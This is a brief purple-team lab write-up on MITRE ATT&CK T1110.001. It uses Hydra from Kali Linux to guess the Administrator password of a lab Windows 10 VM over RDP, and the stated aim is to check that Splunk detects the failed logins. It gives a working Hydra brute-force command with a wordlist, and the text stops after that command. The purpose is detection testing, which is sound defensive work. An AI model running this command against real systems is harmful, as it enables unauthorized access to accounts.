# T1110.001 - Brute Force: Password Guessing (Hydra)

**MITRE ATT&CK Technique:** [T1110.001]

**Attack Type:** Password Guessing using Hydra from Kali Linux  
**Target:** Windows 10 VM (Local account or RDP/SMB service)  
**Purple Team Goal:** Simulate brute-force credential access and validate detection in Splunk

## Objective
Demonstrate how an attacker can use **Hydra** to perform password guessing against a Windows machine and show how this activity appears in Splunk (failed login attempts).

## Tools Used
- **Kali Linux** – Attacker machine
- **Hydra** – Brute-force tool
- **Windows 10 VM** – Target with weak password
- **Splunk** – For log analysis and detection
- **if kali penetration test fails - invoke atomic red team to simulate the attack**
## Attack Execution (Kali Linux)

### Command used:
```bash
hydra -t 1 -V -f -l Administrator -P /path/to/wordlist.txt rdp://<windows-ip>
